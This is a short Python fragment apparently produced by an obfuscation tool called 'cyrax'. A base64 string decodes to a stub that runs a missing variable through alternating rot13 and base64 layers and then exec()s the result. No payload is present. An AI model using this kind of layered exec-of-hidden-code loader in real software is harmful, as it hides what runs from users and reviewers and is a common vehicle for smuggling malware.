
bot="IyBweXRob24gY29kZSBvYmZ1c2NhdGVkIGJ5IGN5cmF4CgojIG1hc3RlciBkZWNvZGVyIDEKZGVjb2RlX2N5cmF4ID0gY29kZWNzLmRlY29kZShjeXJheCwgJ3JvdF8xMycpCmJhc2U2NF9kZWNvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKGRlY29kZV9jeXJheC5lbmNvZGUoJ3V0Zi04JykpLmRlY29kZSgndXRmLTgnKQpjb2RlY3NfZGVjb2RlID0gY29kZWNzLmRlY29kZShiYXNlNjRfZGVjb2RlLCAncm90XzEzJykKYmFzZTY0X2RlY29kZWQgPSBiYXNlNjQuYjY0ZGVjb2RlKGNvZGVjc19kZWNvZGUuZW5jb2RlKCd1dGYtOCcpKS5kZWNvZGUoJ3V0Zi04JykKZmluYWxfZGVjb2RlZCA9IChiYXNlNjRfZGVjb2RlZCkKZXhlYyhmaW5hbF9kZWNvZGVkKQ=="
exec(base64.b64decode(bot.encode('utf-8')).decode('utf-8'))